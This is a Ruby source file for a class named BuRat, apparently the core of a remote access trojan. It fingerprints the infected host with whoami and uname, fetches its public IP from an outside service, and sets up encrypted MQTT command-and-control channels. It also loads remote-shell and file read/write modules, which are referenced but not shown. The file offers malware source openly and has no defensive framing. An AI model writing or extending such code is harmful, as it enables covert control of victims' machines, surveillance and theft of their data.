require 'securerandom'
require 'os'
require 'open-uri'
require 'paho-mqtt'

require_relative 'internals/encryption'
require_relative 'internals/serialization'
require_relative 'bushido/filerw/bufilerw'
require_relative 'bushido/remoteshell/buremoteshell'

class BuRat
  attr_reader :id, :host, :os, :ip
  attr_accessor :status, :internals, :bushido
  def initialize()
    @id = SecureRandom.hex(2)
    @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
    @os = (OS.windows? ? `ver` : `uname -sr`).strip
    @ip = open('http://whatismyip.akamai.com').read
    @status = :offline
    @internals = {
      :mqtt           => PahoMqtt::Client.new,
      :serialization  => Internals::Serialization.new,
      :rsa            => Internals::RSA.new,
      :aes            => Internals::AES.new,
      :digest         => Internals::Digest.new
    }
    @bushido = {
      :remoteshell    => Bushido::BuRemoteShell.new,
      :filerw         => Bushido::BuFileReadWrite.new
    }
    @cmd_topics = []
  end

  def profile()
    return profile = {
    	:id => @id,
    	:host => @host,
    	:os => @os,
    	:ip => @ip,
    	:status => @status,
    	:aes => {
    		:key => @internals[:aes].key,
    		:iv => @internals[:aes].iv
    	}
    }
  end

  def seen(data)
  	data = @internals[:serialization].serialize(data)
  	data = @internals[:aes].encrypt(data)
  	return data
  end

  def deseen(data)
  	data = @internals[:aes].decrypt(data)
  	data = @internals[:serialization].deserialize(data)
  	return data
  end

  def add_topic_callback(topic, &block)
    #topic = digest_topic(topic)
    @cmd_topics.push([topic, 2])
    @internals[:mqtt].add_topic_callback(topic, block)
  end

  def publish(id, topic, payload="", retain=false, qos=0)
    topic = topic.dup
    topic['+'] = id
    #topic = digest_topic(topic)
    @internals[:mqtt].publish(topic, payload, retain, qos)
  end

  def subscribe()
    @internals[:mqtt].subscribe(@cmd_topics)
  end

  private
  def digest_topic(topic)
    levels = topic.split('/')
  	levels.each_with_index do |level, index|
  		if level != '+' && level != '#' then
  			levels[index] = @internals[:digest].digest(level)
  		end
  	end
  	topic = levels.join('/')
    return topic
  end
end
